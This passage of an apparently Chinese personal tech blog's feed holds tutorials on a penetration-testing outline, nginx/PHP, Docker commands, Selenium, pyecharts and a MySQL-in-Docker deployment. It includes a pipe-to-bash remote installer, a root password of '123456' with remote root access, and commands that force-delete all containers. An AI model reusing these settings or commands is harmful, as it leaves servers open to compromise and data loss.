    <category term="XSS" scheme="http://www.tanglx.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试的流程</title>
    <link href="http://www.tanglx.cn/2024/12/10/%E7%BD%91%E5%AE%89/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E6%B5%81%E7%A8%8B/"/>
    <id>http://www.tanglx.cn/2024/12/10/%E7%BD%91%E5%AE%89/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E6%B5%81%E7%A8%8B/</id>
    <published>2024-12-10T11:58:27.000Z</published>
    <updated>2024-12-10T12:36:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、渗透测试的流程"><a href="#一、渗透测试的流程" class="headerlink" title="一、渗透测试的流程"></a>一、渗透测试的流程</h1><h2 id="1-确认目标"><a href="#1-确认目标" class="headerlink" title="1.确认目标"></a>1.确认目标</h2><ul><li>范围</li><li>规则（限制条件）</li><li>需求</li><li>授权(确定哪些能做，哪些不能做)</li></ul><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集*"></a>2.信息收集*</h2><p>域名信息、ip段、开放的端口、网站架构、文件目录结构、软件版本、waf、旁站、c段、社会工程学类(收集信息)..</p><h2 id="3-漏洞扫描"><a href="#3-漏洞扫描" class="headerlink" title="3.漏洞扫描"></a>3.漏洞扫描</h2><ul><li>权威的漏洞数据库平台</li></ul><p>国家信息安全漏洞库(CNNVD)<a href="https://www.cnnvd.org.cn/">网址</a><br>国家信息安全漏洞共享平台(CNVD) <a href="https://www.cnvd.org.cn/">网址</a><br>国家工业信息安全漏洞库(CICSVD) <a href="https://www.cics-vd.org.cn/">网址</a><br>CVE <a href="https://cve.mitre.org/">网址</a></p><ul><li>使用扫描工具</li></ul><h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><p>攻击<br>防御绕过(防火墙、waf、ids、监控系统)<br>维持访问(后渗透访问)</p><h2 id="5-形成报告-清除痕迹"><a href="#5-形成报告-清除痕迹" class="headerlink" title="5.形成报告&#x2F;清除痕迹"></a>5.形成报告&#x2F;清除痕迹</h2><p>发现了什么漏洞<br>危害性(低危、中危、高危)<br>怎么发现的<br>如何复现<br>原因分析<br>修补建议</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;一、渗透测试的流程&quot;&gt;&lt;a href=&quot;#一、渗透测试的流程&quot; class=&quot;headerlink&quot; title=&quot;一、渗透测试的流程&quot;&gt;&lt;/a&gt;一、渗透测试的流程&lt;/h1&gt;&lt;h2 id=&quot;1-确认目标&quot;&gt;&lt;a href=&quot;#1-确认目标</summary>
      
    
    
    
    <category term="网安" scheme="http://www.tanglx.cn/categories/%E7%BD%91%E5%AE%89/"/>
    
    
    <category term="渗透" scheme="http://www.tanglx.cn/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="网安" scheme="http://www.tanglx.cn/tags/%E7%BD%91%E5%AE%89/"/>
    
    <category term="测试" scheme="http://www.tanglx.cn/tags/%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>armbian小主机部署博客系统</title>
    <link href="http://www.tanglx.cn/2024/11/20/%E6%8A%98%E8%85%BE/armbian%E5%B0%8F%E4%B8%BB%E6%9C%BA%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/"/>
    <id>http://www.tanglx.cn/2024/11/20/%E6%8A%98%E8%85%BE/armbian%E5%B0%8F%E4%B8%BB%E6%9C%BA%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/</id>
    <published>2024-11-20T08:54:36.000Z</published>
    <updated>2024-11-20T10:01:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="1-安装nginx等环境"><a href="#1-安装nginx等环境" class="headerlink" title="1.安装nginx等环境"></a>1.安装nginx等环境</h1><p>nginx相比apache更加轻量节省空间</p><pre><code class="javascript">sudo apt updatesudo apt upgradesudo systemctl restart nginxsudo apt install php-sqlite3sudo apt install php7.3 php7.3-fpm php7.3-cli</code></pre><p>配置Nginx与PHP-FPM</p><pre><code class="javascript">vim /etc/nginx/sites-available/default</code></pre><p>添加</p><pre><code class="javascript">location ~ \.php$ &#123;    include snippets/fastcgi-php.conf;    fastcgi_pass unix:/run/php/php7.3-fpm.sock;&#125;</code></pre><p>重启nginx与php-fpm</p><pre><code class="javascript">sudo systemctl restart nginxsudo systemctl restart php7.3-fpm</code></pre><p>测试安装</p><pre><code class="javascript">echo &quot;&lt;?php phpinfo(); ?&gt;&quot; | sudo tee /var/www/html/info.php</code></pre><p>在浏览器中访问http:&#x2F;&#x2F;<your_server_ip>&#x2F;info.php，你应该看到PHP信息页面。如果页面显示了PHP版本，说明安装成功</p><h1 id="2-安装zblog"><a href="#2-安装zblog" class="headerlink" title="2.安装zblog"></a>2.安装zblog</h1><p><a href="https://www.zblogcn.com/">官网</a><br>本机使用版本为1.7</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;1-安装nginx等环境&quot;&gt;&lt;a href=&quot;#1-安装nginx等环境&quot; class=&quot;headerlink&quot; title=&quot;1.安装nginx等环境&quot;&gt;&lt;/a&gt;1.安装nginx等环境&lt;/h1&gt;&lt;p&gt;nginx相比apache更加轻量</summary>
      
    
    
    
    <category term="折腾" scheme="http://www.tanglx.cn/categories/%E6%8A%98%E8%85%BE/"/>
    
    
    <category term="armbian" scheme="http://www.tanglx.cn/tags/armbian/"/>
    
    <category term="折腾" scheme="http://www.tanglx.cn/tags/%E6%8A%98%E8%85%BE/"/>
    
    <category term="博客" scheme="http://www.tanglx.cn/tags/%E5%8D%9A%E5%AE%A2/"/>
    
    <category term="zblog" scheme="http://www.tanglx.cn/tags/zblog/"/>
    
  </entry>
  
  <entry>
    <title>docker基本使用</title>
    <link href="http://www.tanglx.cn/2024/11/20/%E5%B7%A5%E5%85%B7/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>http://www.tanglx.cn/2024/11/20/%E5%B7%A5%E5%85%B7/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2024-11-20T08:22:35.000Z</published>
    <updated>2024-11-20T08:55:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、docker安装"><a href="#一、docker安装" class="headerlink" title="一、docker安装"></a>一、docker安装</h1><p><strong>1.官网方式安装</strong><br><strong>2.docker网页管理工具</strong><br><em>docker正确安装后使用命令安装</em><br>安装中文版 2.19.5 </p><pre><code class="javascript"> docker run -d --restart=always --name=&quot;portainer&quot; -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock 6053537/portainer-ce</code></pre><p>安装中文版2.11.0 </p><pre><code class="javascript"> docker run -d --restart=always --name=&quot;portainer&quot; -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock newrain857/portainer-ce-cn</code></pre><h1 id="二、常用命令"><a href="#二、常用命令" class="headerlink" title="二、常用命令"></a>二、常用命令</h1><p><a href="https://blog.csdn.net/qq_44700578/article/details/136456291">详细博客</a></p><h2 id="1-基础命令"><a href="#1-基础命令" class="headerlink" title="1.基础命令"></a>1.基础命令</h2><pre><code class="shell">systemctl start docker           #启动dockersystemctl stop docker            #关闭dockersystemctl restart docker         #重启dockersystemctl enable docker          #设置开机自启动systemctl status docker          #查看docker运行状态systemctl status docker.service     #查询Docker服务状态docker version                   #查看docker版本号信息docker info                      #查看docker相关信息，包括版本信息、镜像和容器数量等docker stats                     #检查docker守护进程是否在运行docker --help                    #docker命令提示</code></pre><h2 id="2-docker镜像命令"><a href="#2-docker镜像命令" class="headerlink" title="2.docker镜像命令"></a>2.docker镜像命令</h2><pre><code class="shell">docker images  #查看镜像#从Docker Hub查找/搜索镜像docker search [options] TERM      docker search -f STARS=9000 mysql  #搜索stars收藏数不小于10以上的mysql镜像#从服务器拉取镜像拉取镜像docker pull 镜像名       #拉取最新版本的镜像docker pull 镜像名:tag   #拉取镜像，指定版本#推送镜像到服务docker push 镜像名docker push 镜像名:tagdocker save -o 保存的目标文件名称 镜像名 #保存镜像为一个压缩包docker load -i 文件名    #加载压缩包为镜像#删除镜像。当前镜像没有被任何容器使用 才可以删除docker rmi 镜像名/镜像ID     #删除镜像 docker rmi -f 镜像名/镜像ID  #强制删除docker rmi -f 镜像名 镜像名 镜像名     #删除多个 其镜像ID或镜像用用空格隔开即可 docker rmi -f $(docker images -aq)  #删除全部镜像，-a 意思为显示全部, -q 意思为只显示IDdocker image rm 镜像名称/镜像ID  #强制删除镜像#给镜像打标签【有时候根据业务需求 需要对一个镜像进行分类或版本迭代操作，此时就需要给镜像打上标签】docker tag SOURCE_IMAGE[:TAG] TARGET_IMAGE[:TAG]</code></pre><h2 id="3-docker容器命令"><a href="#3-docker容器命令" class="headerlink" title="3.docker容器命令"></a>3.docker容器命令</h2><pre><code class="shell">docker ps      #显示正在运行的容器docker ps -a   #-a,--all  显示全部容器，包括已停止的（默认只显示运行中的容器）#容器怎么来？ docker run 创建并运行一个容器，处于运行状态。#--name 给要运行的容器起的名字；   -p 将宿主机端口与容器端口映射，冒号左侧是宿主机端口，右侧是容器端口；   -d 表示可后台运行容器 （守护式运行）。具体样例见下docker run --name containerName -p 80:80 -d nginx  docker pause 容器名/容器ID    #让一个运行的容器暂停docker unpause name  #让一个容器从暂停状态恢复运行docker stop name     #停止一个或多个运行的容器（杀死进程、回收内存，仅剩文件系统）docker start name    #让一个停止的容器再次运行docker start mysql redis rabbitmq nginx   #启动多个容器docker restart name  #重启一个或多个容器#docker stop与docker kill的区别：都可以终止运行中的docker容器。类似于linux中的kill和kill -9这两个命令，docker stop与kill相似，docker kill与kill -9类似docker kill 容器名    #杀掉一个或多个运行中的容器docker rename 容器名 新容器名  #更换容器名#删除容器docker rm 容器名/容器ID            #删除容器  docker rm -f CONTAINER           #强制删除docker rm -f 容器名 容器名 容器名   #删除多个容器 空格隔开要删除的容器名或容器IDdocker rm -f $(docker ps -aq)    #删除全部容器docker inspect 容器名         #获取容器更多信息 docker ps -l                 #最后一次运行的容器docker port 容器名/容器ID     #查看端口的映射情况docker logs 容器名           #查看容器运行日志         docker logs -f 容器名        #持续跟踪日志docker logs -f --tail=20 容器名  #查看末尾多少行docker diff 容器名        #查看容器的改动#进入容器执行命令，两种方式 docker exec 和 docker attach，推荐docker exec#方式一 docker exec。docker exec -it 容器名/容器ID bash#方式二 docker attach，推荐使用docker execdocker attach 容器名/容器ID#从容器退到自己服务器中（不能用ctrl+C）exit      #直接退出。未添加-d(持久化运行容器)时，执行此参数 容器会被关闭ctrl+p+q  #优雅退出。无论是否添加-d参数，执行此命令容器都不会被关闭</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、docker安装&quot;&gt;&lt;a href=&quot;#一、docker安装&quot; class=&quot;headerlink&quot; title=&quot;一、docker安装&quot;&gt;&lt;/a&gt;一、docker安装&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;1.官网方式安装&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;2</summary>
      
    
    
    
    <category term="工具" scheme="http://www.tanglx.cn/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="工具" scheme="http://www.tanglx.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="docker" scheme="http://www.tanglx.cn/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>python的selenium库配置</title>
    <link href="http://www.tanglx.cn/2024/11/18/%E5%BC%80%E5%8F%91/python%E7%9A%84selenium%E5%BA%93%E9%85%8D%E7%BD%AE/"/>
    <id>http://www.tanglx.cn/2024/11/18/%E5%BC%80%E5%8F%91/python%E7%9A%84selenium%E5%BA%93%E9%85%8D%E7%BD%AE/</id>
    <published>2024-11-18T06:25:40.000Z</published>
    <updated>2024-11-18T11:21:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、selenium版本环境"><a href="#一、selenium版本环境" class="headerlink" title="一、selenium版本环境"></a>一、selenium版本环境</h1><p>seleium版本：<code>3.141.0</code><br>pip安装命令：<code>pip install selenium==3.141.0</code></p><h1 id="二、浏览器驱动下载"><a href="#二、浏览器驱动下载" class="headerlink" title="二、浏览器驱动下载"></a>二、浏览器驱动下载</h1><p>Chrome驱动：<br>Chrome130以后：<a href="https://googlechromelabs.github.io/chrome-for-testing/#stable">链接</a><br>Chrome113-129以后：<a href="https://googlechromelabs.github.io/chrome-for-testing/known-good-versions-with-downloads.json">链接</a><br>Chrome114之前：<a href="https://chromedriver.storage.googleapis.com/index.html">链接</a><br>Edge:<br><a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/">链接</a></p><p>Firefox:<br><a href="https://github.com/mozilla/geckodriver/releases">链接</a></p><p>Safari:<br><a href="https://webkit.org/blog/6900/webdriver-support-in-safari-10/">链接</a></p><h1 id="三、配置浏览器驱动"><a href="#三、配置浏览器驱动" class="headerlink" title="三、配置浏览器驱动"></a>三、配置浏览器驱动</h1><h2 id="3-1Chrome浏览器"><a href="#3-1Chrome浏览器" class="headerlink" title="3.1Chrome浏览器"></a>3.1Chrome浏览器</h2><pre><code class="python">#导入库import timefrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.chrome.service import Servicefrom selenium.webdriver.chrome.options import Optionsoptions = Options()# 设置 Chrome 驱动路径driver_path=&quot;../call/chromedriver.exe&quot;  # 替换为 chromedriver 的实际路径driver = webdriver.Chrome(executable_path=driver_path, options=options)#配置driver参数(可选)driver.maximize_window()    #窗口最大化driver.delete_all_cookies()  # 清空cookie# 加载 HTMLdriver.get(f&quot;http://www.baidu.com&quot;)</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;一、selenium版本环境&quot;&gt;&lt;a href=&quot;#一、selenium版本环境&quot; class=&quot;headerlink&quot; title=&quot;一、selenium版本环境&quot;&gt;&lt;/a&gt;一、selenium版本环境&lt;/h1&gt;&lt;p&gt;seleium版本</summary>
      
    
    
    
    <category term="开发" scheme="http://www.tanglx.cn/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="python" scheme="http://www.tanglx.cn/tags/python/"/>
    
    <category term="开发" scheme="http://www.tanglx.cn/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="seleium" scheme="http://www.tanglx.cn/tags/seleium/"/>
    
  </entry>
  
  <entry>
    <title>debian利用docker部署安全系统</title>
    <link href="http://www.tanglx.cn/2024/07/28/linux/debian%E5%88%A9%E7%94%A8docker%E9%83%A8%E7%BD%B2%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/"/>
    <id>http://www.tanglx.cn/2024/07/28/linux/debian%E5%88%A9%E7%94%A8docker%E9%83%A8%E7%BD%B2%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/</id>
    <published>2024-07-28T07:01:17.000Z</published>
    <updated>2024-07-28T08:50:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>环境<br><code>debian12.6</code></p><h2 id="一、安装与配置docker"><a href="#一、安装与配置docker" class="headerlink" title="一、安装与配置docker"></a>一、安装与配置docker</h2><p>1.安装docker<br>国内安装脚本</p><pre><code class="shell">sudo curl -fsSL https://gitee.com/tech-shrimp/docker_installer/releases/download/latest/linux.sh| bash -s docker --mirror Aliyun</code></pre><p>2.配置docker镜像地址<code>sudo vi /etc/docker/daemon.json</code></p><pre><code class="json">&#123;    &quot;registry-mirrors&quot;: [        &quot;https://docker.m.daocloud.io&quot;,        &quot;https://docker.1panel.live&quot;,        &quot;https://hub.rat.dev&quot;    ]&#125;</code></pre><p>重启docker并设置开机自启<br><code>sudo systemctl enable docker</code><br><code>sudo systemctl enable docker</code><br>3.安装docker web面板(portainer)</p><pre><code class="javascript">docker run -d --restart=always --name=&quot;portainer&quot; -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock registry.cn-beijing.aliyuncs.com/deanmr/portainer-ce:zh-cn</code></pre><h2 id="二、安装mysql"><a href="#二、安装mysql" class="headerlink" title="二、安装mysql"></a>二、安装mysql</h2><p>1.拉取镜像<br><code>docker pull mysql</code></p><p>2.运行镜像</p><pre><code class="javascript">docker run --name mysql --restart=always --privileged=true \-v /usr/local/mysql/data:/var/lib/mysql \-v /usr/local/mysql/conf.d:/etc/mysql/conf.d \-v /etc/localtime:/etc/localtime:ro \-e MYSQL_ROOT_PASSWORD=123456 -p 3306:3306 -d mysql:latest</code></pre><p>密码为123456<br>3.配置mysql</p><pre><code class="javascript">cd /usr/local/mysqlllcd confvi my.cnf</code></pre><p>在my.cnf中写入</p><pre><code class="javascript">[client]default-character-set=utf8mb4[mysql]default-character-set=utf8mb4[mysqld]# 设置东八区时区default-time_zone = &#39;+8:00&#39;# 设置密码验证规则，default_authentication_plugin参数已被废弃# 改为authentication_policy#default_authentication_plugin=mysql_native_passwordauthentication_policy=mysql_native_password# 限制导入和导出的数据目录# 为空，不限制导入到处的数据目录；# 指定目录，必须从该目录导入到处，且MySQL不会自动创建该目录；# 为NULL，禁止导入与导出功能#secure_file_priv=/var/lib/mysqlsecure_file_priv=init_connect=&#39;SET collation_connection = utf8mb4_0900_ai_ci&#39;init_connect=&#39;SET NAMES utf8mb4&#39;character-set-server=utf8mb4collation-server=utf8mb4_0900_ai_ciskip-character-set-client-handshakeskip-name-resolve</code></pre><p>4.配置授权远程访问<br><strong>进入容器</strong></p><pre><code class="bash">docker exec -it mysql /bin/bash</code></pre><p><strong>登录mysql</strong></p><pre><code class="javascript">mysql -u root -p</code></pre><p><strong>选择数据库</strong></p><pre><code class="nginx">show databases;use mysql;</code></pre><p> <strong>查看用户连接情况</strong></p><pre><code class="pgsql"> select host, user, plugin,  authentication_string, password_expired from user;</code></pre><p><strong>修改密码认证方式</strong></p><pre><code class="javascript">ALTER USER root@&#39;%&#39; IDENTIFIED WITH mysql_native_password BY &#39;123456&#39;;ALTER USER root@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;123456&#39;;-- 刷新权限FLUSH PRIVILEGES;</code></pre><p><strong>退出容器</strong><br><code>exit</code></p><p>5.重启mysql<br>设置docker启动时启动mysql</p><pre><code class="javascript">docker update mysql --restart=always</code></pre><p>重启mysql</p><pre><code class="maxima">docker restart mysql</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境&lt;br&gt;&lt;code&gt;debian12.6&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;一、安装与配置docker&quot;&gt;&lt;a href=&quot;#一、安装与配置docker&quot; class=&quot;headerlink&quot; title=&quot;一、安装与配置docker&quot;&gt;&lt;/a&gt;一、安装与配置doc</summary>
      
    
    
    
    <category term="linux" scheme="http://www.tanglx.cn/categories/linux/"/>
    
    
    <category term="linux" scheme="http://www.tanglx.cn/tags/linux/"/>
    
    <category term="debian" scheme="http://www.tanglx.cn/tags/debian/"/>
    
    <category term="安全系统" scheme="http://www.tanglx.cn/tags/%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Python安全编程</title>
    <link href="http://www.tanglx.cn/2024/07/01/%E5%BC%80%E5%8F%91/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"/>
    <id>http://www.tanglx.cn/2024/07/01/%E5%BC%80%E5%8F%91/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/</id>
    <published>2024-07-01T08:54:44.000Z</published>
    <updated>2024-07-01T08:55:33.000Z</updated>
    
    
    
    
    <category term="开发" scheme="http://www.tanglx.cn/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="python" scheme="http://www.tanglx.cn/tags/python/"/>
    
    <category term="安全编程" scheme="http://www.tanglx.cn/tags/%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"/>
    
    <category term="安全" scheme="http://www.tanglx.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>解决pyechart模块绘制地图无数据</title>
    <link href="http://www.tanglx.cn/2024/06/18/%E5%BC%80%E5%8F%91/%E8%A7%A3%E5%86%B3pyechart%E6%A8%A1%E5%9D%97%E7%BB%98%E5%88%B6%E5%9C%B0%E5%9B%BE%E6%97%A0%E6%95%B0%E6%8D%AE/"/>
    <id>http://www.tanglx.cn/2024/06/18/%E5%BC%80%E5%8F%91/%E8%A7%A3%E5%86%B3pyechart%E6%A8%A1%E5%9D%97%E7%BB%98%E5%88%B6%E5%9C%B0%E5%9B%BE%E6%97%A0%E6%95%B0%E6%8D%AE/</id>
    <published>2024-06-18T07:26:39.000Z</published>
    <updated>2024-06-18T07:54:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>在绘制地图发现没有数据<br><img src="https://picture.tanglx.cn/web/2024/1718695755122.png" alt="enter description here"><br><strong>错误原因:</strong><br>传入数据中的省份名称不规范<br>例如：</p><pre><code class="python">data = [    (&quot;北京&quot;, 99),    (&quot;上海&quot;, 199),    (&quot;湖南&quot;, 299),    (&quot;台湾&quot;, 399),    (&quot;广东&quot;, 499)]</code></pre><p><strong>解决办法：</strong><br>使用此函数，把传入地图的数据传入函数进行处理(返回规范后的数据)<br>函数使用语法:<code>data=norm_province(data)</code></p><blockquote><p>data为存放地图的数据，传入nrom_province变量中返回处理后的数据</p></blockquote><pre><code class="python">def norm_province(data):    &quot;&quot;&quot;    :param data: 传入pyecharts地图模块中的data数据    :return: 返回校正后的data数据    &quot;&quot;&quot;    province = (&quot;新疆维吾尔自治区&quot;, &quot;西藏自治区&quot;, &quot;宁夏回族自治区&quot;, &quot;广西壮族自治区&quot;, &quot;内蒙古自治区&quot;, &quot;澳门特别行政区&quot;,                &quot;香港特别行政区&quot;, &quot;重庆市&quot;, &quot;北京市&quot;, &quot;天津市&quot;, &quot;上海市&quot;, &quot;甘肃省&quot;, &quot;青海省&quot;, &quot;四川省&quot;, &quot;云南省&quot;,                &quot;贵州省&quot;, &quot;陕西省&quot;, &quot;湖南省&quot;, &quot;湖北省&quot;, &quot;河南省&quot;, &quot;山西省&quot;, &quot;河北省&quot;, &quot;辽宁省&quot;, &quot;吉林省&quot;, &quot;黑龙江省&quot;,                &quot;山东省&quot;, &quot;江苏省&quot;, &quot;安徽省&quot;, &quot;浙江省&quot;, &quot;江西省&quot;, &quot;福建省&quot;, &quot;台湾省&quot;, &quot;广东省&quot;, &quot;海南省&quot;)    norm_data = []    for x in data:        x=list(x)        for area in province:            if x[0] in area:                x[0]=area                x=tuple(x)                norm_data.append(x)    return norm_data</code></pre><p><strong>成功截图:</strong><br><img src="https://picture.tanglx.cn/web/2024/1718696511508.png" alt="enter description here"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在绘制地图发现没有数据&lt;br&gt;&lt;img src=&quot;https://picture.tanglx.cn/web/2024/1718695755122.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;&lt;strong&gt;错误原因:&lt;/strong&gt;&lt;br</summary>
      
    
    
    
    <category term="开发" scheme="http://www.tanglx.cn/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="python" scheme="http://www.tanglx.cn/tags/python/"/>
    
    <category term="开发" scheme="http://www.tanglx.cn/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="数据可视化" scheme="http://www.tanglx.cn/tags/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/"/>
    
    <category term="pyechart模块" scheme="http://www.tanglx.cn/tags/pyechart%E6%A8%A1%E5%9D%97/"/>
    
  </entry>
  
  <entry>
    <title>Python数据可视化开发</title>
    <link href="http://www.tanglx.cn/2024/06/14/%E5%BC%80%E5%8F%91/Python%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96%E5%BC%80%E5%8F%91/"/>
    <id>http://www.tanglx.cn/2024/06/14/%E5%BC%80%E5%8F%91/Python%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96%E5%BC%80%E5%8F%91/</id>
    <published>2024-06-14T03:29:08.000Z</published>
    <updated>2024-06-18T12:43:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、pyecharts模块"><a href="#一、pyecharts模块" class="headerlink" title="一、pyecharts模块"></a>一、pyecharts模块</h1><p>pyecharts模块可以完成数据可视化效果图<br><a href="https://pyecharts.org/">pyecharts官网</a><br><a href="https://gallery.pyecharts.org/">pyecharts官网画廊</a>，官方示例</p><h1 id="二、构建折线图"><a href="#二、构建折线图" class="headerlink" title="二、构建折线图"></a>二、构建折线图</h1><p>构建折线图以<code>x轴、y轴、名称</code>三个要素为构建基础<br>x轴和y轴的数据以列表的形式存放</p><h2 id="2-1、创建折线图"><a href="#2-1、创建折线图" class="headerlink" title="2.1、创建折线图"></a>2.1、创建折线图</h2><pre><code class="python">#导入包from pyecharts.charts import Line#创建一个折线图对象line = Line()#给折线图对象添加x轴数据line.add_xaxis([&quot;中国&quot;,&quot;美国&quot;,&quot;德国&quot;])#给折线图添加y轴数据line.add_yaxis(&quot;GDP&quot;,[30,20,10])#通过rander方法，将代码生成图像line.render(&quot;名称.html&quot;)#</code></pre><h2 id="2-2、配置项"><a href="#2-2、配置项" class="headerlink" title="2.2、配置项"></a>2.2、配置项</h2><h3 id="2-2-1、全局配置选项"><a href="#2-2-1、全局配置选项" class="headerlink" title="2.2.1、全局配置选项"></a>2.2.1、全局配置选项</h3><pre><code class="python">#导入包from pyecharts.charts import Line#导入配置项from pyecharts.options import TitleOpts,LegendOpts,ToolboxOpts,VisualMapOpts#创建一个折线图对象line = Line()#创建全局配置项line.set_global_opts(    title_opts=TitleOpts(title=&quot;GDP展示&quot;,pos_left=&quot;center&quot;,pos_bottom=&quot;1%&quot;),  #标题展示    legend_opts=LegendOpts(is_show=True),  #图例    toolbox_opts=ToolboxOpts(is_show=True), #工具箱    visualmap_opts=VisualMapOpts(is_show=False) #视觉映射)</code></pre><h3 id="2-2-2、系列配置选项"><a href="#2-2-2、系列配置选项" class="headerlink" title="2.2.2、系列配置选项"></a>2.2.2、系列配置选项</h3><pre><code class="python">#导入包from pyecharts.charts import Linefrom pyecharts.options import LabelOpts#给折线图y轴关闭数据显示line.add_yaxis(&quot;GDP&quot;,[30,20,10],label_opts=LabelOpts(is_show=False))</code></pre><h1 id="三、构建地图"><a href="#三、构建地图" class="headerlink" title="三、构建地图"></a>三、构建地图</h1><h2 id="3-1、创建地图"><a href="#3-1、创建地图" class="headerlink" title="3.1、创建地图"></a>3.1、创建地图</h2><p>构建地图以<code>名称、数据、地图类型</code>三要素为构建要素<br>地图类型默认为<code>&quot;china&quot;</code>(可以不写),也可以写全国各省例如：<code>&quot;云南&quot;</code>(同时导入的data数据也要写为省内各市)<br>map数据以列表嵌套元组的形式存放<code>[(地区1,数值),(地区2,数值)]</code></p><pre><code class="python">#导包from pyecharts.charts import Map# 创建对象map = Map()# 创建数据data = [    (&quot;云南省&quot;,1000),    (&quot;上海市&quot;,900),    (&quot;四川省&quot;,898),    (&quot;广西壮族自治区&quot;,720),    (&quot;广东省&quot;,450),    (&quot;山东省&quot;,700)]#传入数据map.add(&quot;测试&quot;,data,&quot;china&quot;)#数据名称,数据,地图类型(默认为china，也可以写省份)#生成地图map.render(&quot;名称.html&quot;)</code></pre><p>注意事项：</p><ul><li>各个省的命名规则需要规范，否则数据无法显示</li></ul><pre><code class="text">&quot;新疆维吾尔自治区&quot;, &quot;西藏自治区&quot;, &quot;宁夏回族自治区&quot;, &quot;广西壮族自治区&quot;, &quot;内蒙古自治区&quot;, &quot;澳门特别行政区&quot;,&quot;香港特别行政区&quot;, &quot;重庆市&quot;, &quot;北京市&quot;, &quot;天津市&quot;, &quot;上海市&quot;, &quot;甘肃省&quot;, &quot;青海省&quot;, &quot;四川省&quot;, &quot;云南省&quot;,&quot;贵州省&quot;, &quot;陕西省&quot;, &quot;湖南省&quot;, &quot;湖北省&quot;, &quot;河南省&quot;, &quot;山西省&quot;, &quot;河北省&quot;, &quot;辽宁省&quot;, &quot;吉林省&quot;, &quot;黑龙江省&quot;,&quot;山东省&quot;, &quot;江苏省&quot;, &quot;安徽省&quot;, &quot;浙江省&quot;, &quot;江西省&quot;, &quot;福建省&quot;, &quot;台湾省&quot;, &quot;广东省&quot;, &quot;海南省</code></pre><h2 id="3-2、配置项"><a href="#3-2、配置项" class="headerlink" title="3.2、配置项"></a>3.2、配置项</h2><h3 id="3-2-1、全局配置项"><a href="#3-2-1、全局配置项" class="headerlink" title="3.2.1、全局配置项"></a>3.2.1、全局配置项</h3><p>地图颜色<a href="https://tool.oschina.net/commons?type=3">RGB对照表</a><br>地图颜色显示</p><pre><code class="python">#导入options下的VisualMapOpts,TitleOpts包from pyecharts.options import VisualMapOpts,TitleOpts# 设置全局选项-地图颜色map.set_global_opts(    title_opts=TitleOpts(title=&quot;全国疫情地图&quot;),#大标题    visualmap_opts=VisualMapOpts(        is_show=True,#是否显示        is_piecewise=True,#是否分段        pieces=[            &#123;&quot;min&quot;: 1, &quot;max&quot;: 9, &quot;label&quot;: &quot;1-9&quot;, &quot;color&quot;: &quot;#CCFFFF&quot;&#125;,            &#123;&quot;min&quot;: 10, &quot;max&quot;: 99, &quot;label&quot;: &quot;10-99&quot;, &quot;color&quot;: &quot;#FF6666&quot;&#125;,            &#123;&quot;min&quot;: 100, &quot;max&quot;: 500, &quot;label&quot;: &quot;100-500&quot;, &quot;color&quot;: 